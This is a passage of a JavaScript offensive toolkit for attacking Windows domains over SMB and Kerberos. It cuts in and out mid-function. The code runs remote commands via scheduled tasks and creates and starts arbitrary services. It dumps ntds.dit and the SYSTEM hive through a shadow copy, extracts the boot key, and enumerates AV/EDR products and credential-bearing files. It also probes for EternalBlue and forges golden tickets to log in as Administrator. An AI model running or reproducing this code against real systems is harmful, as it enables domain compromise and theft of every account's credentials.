        await tsch.registerTask(taskPath, taskXml(command, outFile), 2);
        return await runAndCollect(c, host, log, tsch, taskPath, outFile);
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'atexec', e.message);
    return null;
  }
}

// Trigger, poll for output file, and clean up. Shared between the initial
// bind path and the auth-retry path.
async function runAndCollect(c, host, log, tsch, taskPath, outFile) {
  log('info', 'smb', host, 'atexec', `task registered: ${taskPath}`);
  try { await tsch.run(taskPath); } catch (e) { log('warn', 'smb', host, 'atexec', `SchRpcRun: ${e.message}`); }
  // Poll up to 10 s (impacket's default) — cmd.exe /c writes atomically only
  // after all its own output has flushed; a fixed sleep loses fast commands
  // to a stale-file read and slow commands to a still-empty file.
  const relPath = outFile.replace('C:\\', '').replace(/\\/g, '\\');
  const tid2 = await c.treeConnect('C$');
  let data = null;
  const deadline = Date.now() + 10000;
  while (Date.now() < deadline) {
    try {
      const fid2 = await c.createFile(tid2, relPath, { access: 0x00120089, disposition: 1 });
      data = await c.readFileAll(tid2, fid2);
      await c.closeFile(tid2, fid2);
      if (data && data.length > 0) break;
    } catch (_) {
      // STATUS_OBJECT_NAME_NOT_FOUND / STATUS_SHARING_VIOLATION while task still runs.
    }
    await new Promise((r) => setTimeout(r, 300));
  }
  try { await tsch.delete(taskPath); } catch (e) { log('warn', 'smb', host, 'atexec', `SchRpcDelete: ${e.message}`); }
  try { await c.deleteFile(tid2, relPath); } catch {}
  if (!data || !data.length) {
    log('warn', 'smb', host, 'atexec', 'no output within 10 s (task completed but file empty)');
    return '';
  }
  const text = new TextDecoder('utf-8').decode(data);
  for (const line of text.split('\n').filter(Boolean)) {
    log('ok', 'smb', host, '', line.trimEnd());
  }
  return text;
}

const SVC_STATES = { 1: 'STOPPED', 2: 'START_PENDING', 3: 'STOP_PENDING', 4: 'RUNNING', 5: 'CONTINUE_PENDING', 6: 'PAUSE_PENDING', 7: 'PAUSED' };

export async function smbSvcStart(host, creds, opts, log, svcName) {
  if (!svcName) { log('err', 'smb', host, 'svc-start', 'no service specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const handle = await svc.openService(scm, svcName, 0x000f01ff);
        await svc.startService(handle);
        const state = await svc.queryServiceStatus(handle);
        log('ok', 'smb', host, svcName, `service started (state: ${SVC_STATES[state] || state})`);
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
        return true;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'svc-start', e.message);
    return null;
  }
}

export async function smbSvcStop(host, creds, opts, log, svcName) {
  if (!svcName) { log('err', 'smb', host, 'svc-stop', 'no service specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const handle = await svc.openService(scm, svcName, 0x000f01ff);
        await svc.stopService(handle);
        const state = await svc.queryServiceStatus(handle);
        log('ok', 'smb', host, svcName, `service stopped (state: ${SVC_STATES[state] || state})`);
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
        return true;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'svc-stop', e.message);
    return null;
  }
}

export async function smbSvcStatus(host, creds, opts, log, svcName) {
  if (!svcName) { log('err', 'smb', host, 'svc-status', 'no service specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        // SERVICE_QUERY_STATUS (0x0004) | SERVICE_QUERY_CONFIG (0x0001) | READ_CONTROL (0x00020000)
        const handle = await svc.openService(scm, svcName, 0x00020005);
        const state = await svc.queryServiceStatus(handle);
        const conf = await svc.queryServiceConfig(handle);
        log('ok', 'smb', host, svcName, `${SVC_STATES[state] || state} | path: ${conf.binPath} | start: ${conf.startName || 'LocalSystem'}`);
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
        return { state: SVC_STATES[state] || state, ...conf };
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'svc-status', e.message);
    return null;
  }
}

export async function smbSvcCreate(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) { log('err', 'smb', host, 'svc-create', 'usage: --svc-create NAME BINPATH'); return null; }
  const spaceIdx = args.indexOf(' ');
  const svcName = args.slice(0, spaceIdx);
  const binPath = args.slice(spaceIdx + 1);
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const handle = await svc.createService(scm, svcName, binPath);
        log('ok', 'smb', host, svcName, `service created: ${binPath}`);
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
        return true;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'svc-create', e.message);
    return null;
  }
}

export async function smbSvcDelete(host, creds, opts, log, svcName) {
  if (!svcName) { log('err', 'smb', host, 'svc-delete', 'no service specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const handle = await svc.openService(scm, svcName, 0x000f01ff);
        await svc.deleteService(handle);
        log('ok', 'smb', host, svcName, 'service deleted');
        await svc.closeHandle(handle);
        await svc.closeHandle(scm);
        return true;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'svc-delete', e.message);
    return null;
  }
}

// ============================================================================
// BROKEN — NEEDS FIX. Hidden from --help. Do not re-expose until fixed.
// ----------------------------------------------------------------------------
// The TSCH register-task path returns DCE-RPC fault 0x5 (nca_s_fault_access_
// denied) against Server 2019 DCs even though impacket atexec.py succeeds with
// the same credentials and a byte-identical stub layout (LPWSTR path with
// referent + WSTR xml + flags=TASK_CREATE + NULL sddl + logonType=NONE + empty
// creds; LocalSystem principal S-1-5-18, LogonType=Password, Actions
// Context="LocalSystem"). Something at the SMB session / RPC bind / NDR layer
// still differs from what the server accepts here — needs full pcap-vs-pcap
// comparison against a working impacket run. Meanwhile use --dcsync, which
// gets the same secrets without touching ntds.dit on disk.
//
// The old svcexec path this function used before had its own bug
// (STATUS_INVALID_PIPE_STATE after cmd-wrapper services), so neither approach
// currently works end-to-end.
// ============================================================================
export async function smbNtds(host, creds, opts, log, targetUser) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const shadowId = Math.random().toString(36).slice(2, 8);
      // ADMIN$ share points to C:\Windows, so relative paths under it must
      // NOT re-include "Windows\". Impacket writes VSS output to
      // %SYSTEMROOT%\Temp\... which is C:\Windows\Temp — under ADMIN$ that's
      // just "Temp\<file>". The command-line still uses UNC via 127.0.0.1.
      const outBase = `Temp\\nxc_${shadowId}`;

      // TSCH-based exec (impacket atexec model). More reliable than svcctl —
      // no service-manager pipe state issues and SYSTEM context runs cmd
      // normally with local FS access for redirects.
      //
      // taskXml wraps as: cmd.exe /C <command> > <outputPath> 2>&1
      // — so `command` here is the RAW command (no cmd wrapper) and
      // `outputPath` is where stdout+stderr go.
      // Same TSCH auth pattern as smbAtExec — Server 2019+ enforces
      // PKT_PRIVACY at the RPC layer for SchRpcRegisterTask; a NULL bind
      // fails with 0x5.
      const tschCreds = {
        user: creds.user,
        domain: creds.domain || opts.domain || '',
        password: creds.password,
        hash: parseNtHash(creds.hash),
      };
      const runSchCmd = async (taskSuffix, command, outputPath, waitMs = 5000) => {
        const rand8 = Math.random().toString(36).slice(2, 10);
        const taskPath = `\\${rand8}`;
        try {
          await withPipe(c, host, 'atsvc', async (tx, rd, wr) => {
            const tsch = new Tsch(tx, rd, wr);
            await tsch.bindAuth(tschCreds);
            const xml = taskXml(command, outputPath);
            await tsch.registerTask(taskPath, xml, 2);
            try { await tsch.run(taskPath); } catch {}
          });
        } catch (e) {
          log('warn', 'smb', host, 'ntds', `tsch failed: ${e.message}`);
          throw e;
        }
        await new Promise((r) => setTimeout(r, waitMs));
        try {
          await withPipe(c, host, 'atsvc', async (tx, rd, wr) => {
            const tsch = new Tsch(tx, rd, wr);
            await tsch.bindAuth(tschCreds);
            try { await tsch.delete(taskPath); } catch {}
          });
        } catch {}
      };

      log('info', 'smb', host, 'ntds', 'creating VSS shadow copy...');
      await runSchCmd(`vss_${shadowId}`, `vssadmin create shadow /for=C:`,
                      `C:\\Windows\\${outBase}_vss`, 12000);

      let shadowPath = '';
      try {
        const tid = await c.treeConnect('ADMIN$');
        const fid = await c.createFile(tid, `${outBase}_vss`, { access: 0x00120089, disposition: 1 });
        const data = await c.readFileAll(tid, fid);
        await c.closeFile(tid, fid);
        await c.deleteFile(tid, `${outBase}_vss`);
        const text = new TextDecoder('utf-8').decode(data);
        const match = text.match(/Shadow Copy Volume Name:\s*(\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\d+)/i);
        if (match) shadowPath = match[1];
      } catch (e) {
        log('err', 'smb', host, 'ntds', 'could not read VSS output: ' + e.message);
        return null;
      }

      if (!shadowPath) {
        log('err', 'smb', host, 'ntds', 'could not find shadow copy path in output');
        return null;
      }
      log('info', 'smb', host, 'ntds', `shadow: ${shadowPath}`);

      log('info', 'smb', host, 'ntds', 'copying ntds.dit...');
      // Note: taskXml wraps with cmd.exe /C, so quotes in the DN work fine.
      await runSchCmd(`cp1_${shadowId}`,
        `copy "${shadowPath}\\Windows\\NTDS\\ntds.dit" "C:\\Windows\\${outBase}_ntds" /Y`,
        `C:\\Windows\\${outBase}_ntdscp`, 8000);

      log('info', 'smb', host, 'ntds', 'copying SYSTEM hive...');
      await runSchCmd(`cp2_${shadowId}`,
        `reg save HKLM\\SYSTEM C:\\Windows\\${outBase}_sys /y`,
        `C:\\Windows\\${outBase}_syscp`, 3000);

      const results = [];
      try {
        const tid = await c.treeConnect('ADMIN$');

        log('info', 'smb', host, 'ntds', 'downloading SYSTEM hive...');
        const sysFid = await c.createFile(tid, `${outBase}_sys`, { access: 0x00120089, disposition: 1 });
        const sysData = await c.readFileAll(tid, sysFid);
        await c.closeFile(tid, sysFid);
        await c.deleteFile(tid, `${outBase}_sys`);
        log('ok', 'smb', host, 'ntds', `SYSTEM hive: ${sysData.length} bytes`);

        const bootKey = extractBootKey(sysData);
        if (bootKey) log('info', 'smb', host, 'ntds', `boot key extracted: ${hex(bootKey)}`);

        log('info', 'smb', host, 'ntds', 'downloading ntds.dit (this may take a while)...');
        const ntdsFid = await c.createFile(tid, `${outBase}_ntds`, { access: 0x00120089, disposition: 1 });
        const ntdsData = await c.readFileAll(tid, ntdsFid);
        await c.closeFile(tid, ntdsFid);
        await c.deleteFile(tid, `${outBase}_ntds`);
        log('ok', 'smb', host, 'ntds', `ntds.dit: ${ntdsData.length} bytes`);

        log('info', 'smb', host, 'ntds', 'note: full ntds.dit parsing requires ESE/JET engine — use secretsdump.py locally');
        log('ok', 'smb', host, 'ntds', `extracted ntds.dit (${ntdsData.length} bytes) + SYSTEM hive (${sysData.length} bytes)`);

        if (typeof Blob !== 'undefined' && typeof URL !== 'undefined' && URL.createObjectURL) {
          const ntdsBlob = new Blob([ntdsData], { type: 'application/octet-stream' });
          const ntdsUrl = URL.createObjectURL(ntdsBlob);
          const sysBlob = new Blob([sysData], { type: 'application/octet-stream' });
          const sysUrl = URL.createObjectURL(sysBlob);
          log('ok', 'smb', host, 'ntds', `<a href="${ntdsUrl}" download="ntds.dit" style="color:var(--acc)">Download ntds.dit</a> | <a href="${sysUrl}" download="SYSTEM" style="color:var(--acc)">Download SYSTEM</a>`);
        }
        results.push({ ntds: ntdsData.length, sys: sysData.length, bootKey: bootKey ? hex(bootKey) : null });
      } catch (e) {
        log('err', 'smb', host, 'ntds', 'download failed: ' + e.message);
      }

      log('info', 'smb', host, 'ntds', 'cleaning up shadow copy...');
      await runSchCmd(`del_${shadowId}`,
        `vssadmin delete shadows /shadow=${shadowPath} /quiet`,
        `C:\\Windows\\${outBase}_delout`, 3000);

      return results;
    });
  } catch (e) {
    log('err', 'smb', host, 'ntds', e.message);
    return null;
  }
}

const AV_SERVICES = [
  ['MsMpSvc', 'Windows Defender'], ['WinDefend', 'Windows Defender'],
  ['MBAMService', 'Malwarebytes'], ['mbamservice', 'Malwarebytes'],
  ['SepMasterService', 'Symantec Endpoint Protection'], ['Symantec', 'Symantec'],
  ['ccEvtMgr', 'Symantec'], ['ccSetMgr', 'Symantec'],
  ['savservice', 'Sophos'], ['SAVAdminService', 'Sophos'],
  ['McAfeeFramework', 'McAfee'], ['masvc', 'McAfee'], ['macmnsvc', 'McAfee'],
  ['mfefire', 'McAfee Firewall'], ['McShield', 'McAfee VirusScan'],
  ['kavfsslp', 'Kaspersky'], ['klnagent', 'Kaspersky'], ['AVP', 'Kaspersky'],
  ['KAVFS', 'Kaspersky'], ['KAVFSGT', 'Kaspersky'],
  ['ntrtscan', 'Trend Micro'], ['TmCCSF', 'Trend Micro'], ['tmlisten', 'Trend Micro'],
  ['epsecurity', 'ESET'], ['ekrn', 'ESET'], ['ERAAgent', 'ESET Remote Admin'],
  ['CylanceSvc', 'Cylance'], ['CylanceProtectSvc', 'Cylance'],
  ['CrowdStrike', 'CrowdStrike Falcon'], ['CSFalconService', 'CrowdStrike Falcon'],
  ['SentinelOne', 'SentinelOne'], ['SentinelAgent', 'SentinelOne'],
  ['CarbonBlack', 'Carbon Black'], ['CbDefense', 'Carbon Black'],
  ['cbsvc', 'Carbon Black'], ['RepMgr', 'Carbon Black'],
  ['PaloAltoNetworksSvc', 'Cortex XDR'], ['CortexXDR', 'Cortex XDR'],
  ['bdservicehost', 'Bitdefender'], ['EPSecurityService', 'Bitdefender'],
  ['TaniumClient', 'Tanium'], ['QualysAgent', 'Qualys'],
  ['SplunkForwarder', 'Splunk Forwarder'], ['splunkd', 'Splunk'],
  ['WazuhSvc', 'Wazuh'], ['OssecSvc', 'Wazuh/OSSEC'],
  ['ElasticEndpoint', 'Elastic Endpoint'],
  ['AcronisAgent', 'Acronis'],
];

export async function smbEnumAv(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const found = [];
        for (const [svcName, product] of AV_SERVICES) {
          try {
            const handle = await svc.openService(scm, svcName, 0x00020014);
            const state = await svc.queryServiceStatus(handle);
            const stateStr = SVC_STATES[state] || String(state);
            found.push({ service: svcName, product, state: stateStr });
            log('ok', 'smb', host, product, `${svcName} — ${stateStr}`);
            await svc.closeHandle(handle);
          } catch {}
        }
        if (!found.length) log('info', 'smb', host, 'enum-av', 'no known AV/EDR services detected');
        else log('ok', 'smb', host, 'enum-av', `${found.length} AV/EDR service(s) detected`);
        await svc.closeHandle(scm);
        return found;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'enum-av', e.message);
    return null;
  }
}

function hex(buf) {
  return Array.from(buf, b => b.toString(16).padStart(2, '0')).join('');
}

function extractBootKey(systemHive) {
  try {
    const SCRAMBLE = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7];
    const classNames = ['JD', 'Skew1', 'GBG', 'Data'];
    const bootKeyParts = [];

    for (const name of classNames) {
      const idx = findRegKey(systemHive, `ControlSet001\\Control\\Lsa\\${name}`);
      if (idx < 0) return null;
      const className = extractClassName(systemHive, idx);
      if (!className) return null;
      bootKeyParts.push(className);
    }

    const hexStr = bootKeyParts.join('');
    const raw = new Uint8Array(16);
    for (let i = 0; i < 16; i++) raw[i] = parseInt(hexStr.substr(i * 2, 2), 16);
    const key = new Uint8Array(16);
    for (let i = 0; i < 16; i++) key[i] = raw[SCRAMBLE[i]];
    return key;
  } catch {
    return null;
  }
}

function findRegKey(hive, path) {
  const dv = new DataView(hive.buffer, hive.byteOffset, hive.byteLength);
  if (dv.getUint32(0, true) !== 0x66676572) return -1;
  const rootOff = 4096 + 32;
  const parts = path.split('\\');
  let pos = rootOff;

  for (const part of parts) {
    const sig = dv.getUint16(pos, true);
    if (sig !== 0x6b6e) return -1;
    const subkeyCount = dv.getUint32(pos + 24, true);
    const subkeyListOff = dv.getInt32(pos + 28, true);
    if (subkeyCount === 0 || subkeyListOff < 0) return -1;

    const listPos = 4096 + subkeyListOff + 4;
    const listSig = dv.getUint16(listPos, true);
    const listCount = dv.getUint16(listPos + 2, true);
    let found = -1;

    for (let i = 0; i < listCount; i++) {
      let childOff;
      if (listSig === 0x666c || listSig === 0x686c) {
        childOff = dv.getInt32(listPos + 4 + i * 8, true);
      } else if (listSig === 0x6972) {
        const subListOff = dv.getInt32(listPos + 4 + i * 4, true);
        childOff = subListOff;
      } else {
        return -1;
      }

      const childPos = 4096 + childOff + 4;
      const childSig = dv.getUint16(childPos, true);
      if (childSig !== 0x6b6e) continue;
      const nameLen = dv.getUint16(childPos + 72, true);
      let name = '';
      for (let j = 0; j < nameLen; j++) name += String.fromCharCode(hive[childPos + 76 + j]);
      if (name.toLowerCase() === part.toLowerCase()) {
        found = childPos;
        break;
      }
    }
    if (found < 0) return -1;
    pos = found;
  }
  return pos;
}

function extractClassName(hive, keyOffset) {
  const dv = new DataView(hive.buffer, hive.byteOffset, hive.byteLength);
  const classNameOff = dv.getInt32(keyOffset + 48, true);
  const classNameLen = dv.getUint16(keyOffset + 74, true);
  if (classNameOff < 0 || classNameLen === 0) return null;
  const pos = 4096 + classNameOff + 4;
  let name = '';
  for (let i = 0; i < classNameLen; i += 2) {
    name += String.fromCharCode(dv.getUint16(pos + i, true));
  }
  return name;
}

// Detailed OS/dialect/domain info via SMB2 negotiate + NTLM CHALLENGE
// TargetInfo. Also probes wkssvc for the workstation info block when
// credentials are provided.
export async function smbOsInfo(host, creds, opts, log) {
  try {
    const c = new Smb2Client(host, PORT);
    try {
      await c.connect();
      await c.negotiate();
      const dialectName = { 0x0202: '2.0.2', 0x0210: '2.1', 0x0300: '3.0', 0x0302: '3.0.2', 0x0311: '3.1.1' }[c.dialect] || `0x${c.dialect.toString(16)}`;
      log('ok', 'smb', host, 'dialect', `SMB ${dialectName}`);
      log('ok', 'smb', host, 'signing', c.signingRequired ? 'REQUIRED' : (c.signingEnabled ? 'enabled (not required)' : 'disabled'));
      log('ok', 'smb', host, 'server-guid', c.serverGuid || 'unknown');
      log('ok', 'smb', host, 'encryption', c.encryptionSupported ? 'supported' : 'not supported');

      if (creds && creds.user) {
        try {
          if (opts && opts.auth === 'kerberos') {
            await c.loginKerberos({ user: creds.user, domain: creds.domain, password: creds.password, hash: parseNtHash(creds.hash), kdcHost: (opts && opts.kdc) || host });
          } else {
            await c.login({ user: creds.user, domain: creds.domain, password: creds.password, hash: parseNtHash(creds.hash), localAuth: !!(opts && opts.localAuth) });
          }
          const ti = c.targetInfo || {};
          if (ti.nbComputerName) log('ok', 'smb', host, 'netbios', ti.nbComputerName);
          if (ti.dnsComputerName) log('ok', 'smb', host, 'dns-name', ti.dnsComputerName);
          if (ti.nbDomainName) log('ok', 'smb', host, 'domain-nb', ti.nbDomainName);
          if (ti.dnsDomainName) log('ok', 'smb', host, 'domain-dns', ti.dnsDomainName);
          if (ti.dnsTreeName) log('ok', 'smb', host, 'forest', ti.dnsTreeName);
          const isDc = ti.dnsDomainName && ti.dnsComputerName &&
            ti.dnsDomainName.toLowerCase() !== ti.dnsComputerName.toLowerCase() &&
            ti.dnsComputerName.toLowerCase().endsWith('.' + ti.dnsDomainName.toLowerCase());
          if (isDc) log('ok', 'smb', host, 'role', 'domain member (likely DC or DC-hosted)');
          else if (ti.nbDomainName === ti.nbComputerName) log('ok', 'smb', host, 'role', 'workgroup');
          else if (ti.nbDomainName) log('ok', 'smb', host, 'role', 'domain member');
        } catch (eAuth) {
          log('warn', 'smb', host, 'os-info', `auth failed, only anonymous data shown: ${eAuth.message}`);
        }
      }
      return true;
    } finally {
      try { await c.close(); } catch {}
    }
  } catch (e) {
    log('err', 'smb', host, 'os-info', e.message);
    return null;
  }
}

// Scan a share for files with "interesting" names (creds, configs, backups).
// Uses Smb2Client — SHARE defaults to C$.
export async function smbFiles(host, creds, opts, log, shareName) {
  const share = shareName || 'C$';
  const dirs = ['Users', 'Windows\\Temp', 'Program Files', 'inetpub\\wwwroot', 'Backups'];
  const interesting = [/\.txt$/i, /\.ini$/i, /\.cfg$/i, /\.conf$/i, /\.bak$/i, /\.sql$/i,
    /\.xml$/i, /\.json$/i, /\.ps1$/i, /\.bat$/i, /\.cmd$/i, /\.vbs$/i, /\.kdbx$/i,
    /password/i, /cred/i, /secret/i, /backup/i, /web\.config/i, /\.env$/i, /unattend/i];
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect(share);
      let total = 0, hits = 0;
      for (const dir of dirs) {
        try {
          const dirFid = await c.createFile(tid, dir, { access: 0x00100081, disposition: 1, options: 0x00200021 });
          try {
            const entries = await c.queryDirectory(tid, dirFid, '*');
            for (const e of entries) {
              if (e.name === '.' || e.name === '..') continue;
              total++;
              if (interesting.some((p) => p.test(e.name))) {
                log('warn', 'smb', host, `${share}\\${dir}`, e.name);
                hits++;
              }
            }
          } finally {
            await c.closeFile(tid, dirFid);
          }
        } catch { /* dir not present, skip */ }
      }
      log('ok', 'smb', host, 'files', `${share}: ${hits} interesting of ${total} entries across ${dirs.length} dirs`);
      return { total, hits };
    });
  } catch (e) {
    log('err', 'smb', host, 'files', e.message);
    return null;
  }
}

// Send an SMB1 NEGOTIATE that lists a mix of SMB1 and SMB2 dialects. If the
// server negotiates an SMB1 dialect (index 0/1 = "PC NETWORK PROGRAM 1.0"/
// "LANMAN 1.0" here — but our list starts with "NT LM 0.12"/"SMB 2.002") it
// implies SMB1 is enabled and the host may be EternalBlue-vulnerable if
// unpatched. A modern DC with SMB1 disabled either RSTs or refuses the
// dialect — both are the "not vulnerable" case. Hard 5-second overall
// timeout so we never hang.
export async function smbEternalBlue(host, _creds, _opts, log) {
  let sock, reader, writer;
  try {
    sock = new TCPSocket(host, 445);
    const { readable, writable } = await sock.opened;
    reader = readable.getReader();
    writer = writable.getWriter();

    const negotiateReq = new Uint8Array([
      0x00, 0x00, 0x00, 0x2f,             // NBSS length = 47
      0xff, 0x53, 0x4d, 0x42,             // SMB1 magic
      0x72,                                // SMB_COM_NEGOTIATE
      0x00, 0x00, 0x00, 0x00,             // NTStatus = 0
      0x18,                                // Flags
      0x53, 0xc8,                          // Flags2
      0x00, 0x00,                          // PIDHigh
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SecurityFeatures
      0x00, 0x00,                          // Reserved
      0x00, 0x00,                          // TID
      0xff, 0xfe,                          // PID
      0x00, 0x00,                          // UID
      0x00, 0x00,                          // MID
      0x00,                                // WordCount = 0
      0x0c, 0x00,                          // ByteCount = 12
      0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30,
      0x2e, 0x31, 0x32, 0x00,              // "NT LM 0.12"
    ]);

    await writer.write(negotiateReq);
    const first = await Promise.race([
      reader.read(),
      new Promise((res) => setTimeout(() => res({ timeout: true }), 5000)),
    ]);
    if (first.timeout || first.done) {
      log('ok', 'smb', host, 'ms17-010', 'not vulnerable (SMB1 disabled — no reply)');
      return { vulnerable: false };
    }
    const resp = first.value;
    if (!resp || resp.length < 36) {
      log('ok', 'smb', host, 'ms17-010', 'not vulnerable (short reply)');
      return { vulnerable: false };
    }
    // NBSS(4) + SMB1 header(32) → NTStatus at offset 9..13. If NEGOTIATE
    // returned STATUS_NOT_SUPPORTED / STATUS_SMB_BAD_COMMAND / any error,
    // SMB1 is off.
    const status = resp[9] | (resp[10] << 8) | (resp[11] << 16) | (resp[12] << 24);
    if (status !== 0) {
      log('ok', 'smb', host, 'ms17-010', `not vulnerable (SMB1 rejected: 0x${(status >>> 0).toString(16)})`);
      return { vulnerable: false };
    }
    // After the header comes WordCount(1). NEGOTIATE Response WordCount=17
    // (SMB1 NT LM 0.12). DialectIndex is at offset 4+32+1 = 37 (2 bytes).
    const dialectIndex = resp[37] | (resp[38] << 8);
    if (dialectIndex === 0xffff) {
      log('ok', 'smb', host, 'ms17-010', 'not vulnerable (SMB1 disabled)');
      return { vulnerable: false };
    }
    log('warn', 'smb', host, 'ms17-010', `host accepted SMB1 (dialect index ${dialectIndex}) — MAY BE VULNERABLE (verify patch level)`);
    return { vulnerable: true, dialectIndex };
  } catch (e) {
    const m = /ECONNRESET|closed|EOF|reset/i.test(e.message || '');
    if (m) {
      log('ok', 'smb', host, 'ms17-010', 'not vulnerable (SMB1 disabled — connection reset)');
      return { vulnerable: false };
    }
    log('err', 'smb', host, 'ms17-010', e.message);
    return null;
  } finally {
    try { reader && reader.releaseLock(); } catch {}
    try { writer && writer.releaseLock(); } catch {}
    try { sock && await sock.close(); } catch {}
  }
}

// Enumerate accessible named pipes on IPC$ by trying to open each.
export async function smbPipes(host, creds, opts, log) {
  const known = [
    ['srvsvc', 'Server Service'],
    ['wkssvc', 'Workstation Service'],
    ['samr', 'SAM Remote'],
    ['lsarpc', 'LSA RPC'],
    ['netlogon', 'Netlogon'],
    ['svcctl', 'Service Control'],
    ['winreg', 'Remote Registry'],
    ['atsvc', 'Task Scheduler (AT)'],
    ['eventlog', 'Event Log'],
    ['epmapper', 'Endpoint Mapper'],
    ['spoolss', 'Print Spooler'],
    ['browser', 'Browser Service'],
    ['FssagentRpc', 'File Server Shadow Copy'],
    ['protected_storage', 'Protected Storage'],
    ['ntsvcs', 'Plug and Play'],
    ['efsrpc', 'EFS RPC (PetitPotam)'],
    ['netdfs', 'DFS (DFSCoerce)'],
    ['keysvc', 'Cryptographic Services'],
  ];
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      const found = [];
      for (const [pipe, desc] of known) {
        try {
          const fid = await c.createPipe(tid, pipe);
          log('ok', 'smb', host, pipe, `accessible — ${desc}`);
          await c.closeFile(tid, fid);
          found.push(pipe);
        } catch { /* not present or access denied */ }
      }
      log('ok', 'smb', host, 'pipes', `${found.length} accessible pipe(s)`);
      return found;
    });
  } catch (e) {
    log('err', 'smb', host, 'pipes', e.message);
    return null;
  }
}

// Unauthenticated dialect/signing/encryption/server-GUID probe.
export async function smbDialect(host, _creds, _opts, log) {
  const c = new Smb2Client(host, PORT);
  try {
    await c.connect();
    await c.negotiate();
    const dialectName = { 0x0202: '2.0.2', 0x0210: '2.1', 0x0300: '3.0', 0x0302: '3.0.2', 0x0311: '3.1.1' }[c.dialect] || `0x${c.dialect.toString(16)}`;
    const signing = c.signingRequired ? 'REQUIRED' : (c.signingEnabled ? 'enabled' : 'disabled');
    const encryption = c.encryptionSupported ? 'supported' : 'not supported';
    log('ok', 'smb', host, 'dialect', `SMB ${dialectName}`);
    log('ok', 'smb', host, 'signing', signing);
    log('ok', 'smb', host, 'encryption', encryption);
    log('ok', 'smb', host, 'server-guid', c.serverGuid || 'unknown');
    return { dialect: dialectName, signing, encryption, serverGuid: c.serverGuid };
  } catch (e) {
    log('err', 'smb', host, 'dialect', e.message);
    return null;
  } finally {
    try { await c.close(); } catch {}
  }
}

// ---- Ticket Forging ---------------------------------------------------------

function parseHashBytes(hashStr) {
  let hex = hashStr;
  if (hex.includes(':')) hex = hex.split(':')[1];
  hex = hex.trim();
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  return bytes;
}

export async function smbGoldenTicket(host, creds, opts, log) {
  const krbtgtHash = opts.krbtgt || opts['krbtgt-hash'];
  const domainSid = opts['domain-sid'] || opts.sid;
  const domain = creds.domain || opts.domain;
  if (!krbtgtHash) { log('err', 'smb', host, 'golden', 'need --krbtgt <hash>'); return null; }
  if (!domainSid) { log('err', 'smb', host, 'golden', 'need --domain-sid <S-1-5-21-...>'); return null; }
  if (!domain) { log('err', 'smb', host, 'golden', 'need -d <domain>'); return null; }
  const targetUser = opts['target-user'] || 'Administrator';
  const targetRid = parseInt(opts['target-rid'] || '500', 10);
  try {
    const keyBytes = parseHashBytes(krbtgtHash);
    const etype = keyBytes.length === 32 ? ETYPE.AES256_CTS_HMAC_SHA1_96 : ETYPE.RC4_HMAC;
    log('info', 'smb', host, 'golden', `forging golden ticket for ${targetUser} (RID ${targetRid}) etype=${etype}`);
    const tgt = forgeGoldenTicket({
      username: targetUser, userId: targetRid,
      domain, domainSid, krbtgtKey: keyBytes, etype,
    });
    log('ok', 'smb', host, 'golden', `forged TGT for ${targetUser}@${domain.toUpperCase()}`);

    const kdcHost = opts.kdc || host;
    const transport = new KdcSocketTransport(kdcHost, 88);
    await transport.connect();
    try {
      const krb = new KerberosClient(transport);
      const tgs = await krb.getTGS(tgt, { spn: `cifs/${host}` });
      log('ok', 'smb', host, 'golden', `got service ticket for cifs/${host}`);

      const c = new Smb2Client(host, PORT);
      await c.connect();
      await c.negotiate();
      await c.loginWithTicket(tgs);
      log('ok', 'smb', host, 'golden', `SMB authenticated as ${targetUser}@${domain.toUpperCase()} via golden ticket`);
      const tid = await c.treeConnect('C$');
      log('ok', 'smb', host, 'golden', 'C$ share accessible — golden ticket works');
      await c.close();
      return { success: true, user: targetUser };
    } finally {
      await transport.close();
    }
  } catch (e) {
    log('err', 'smb', host, 'golden', e.message);
    return null;
  }
}

export async function smbSilverTicket(host, creds, opts, log) {
  const serviceHash = opts['service-hash'] || opts['silver-hash'];
  const domainSid = opts['domain-sid'] || opts.sid;
  const domain = creds.domain || opts.domain;
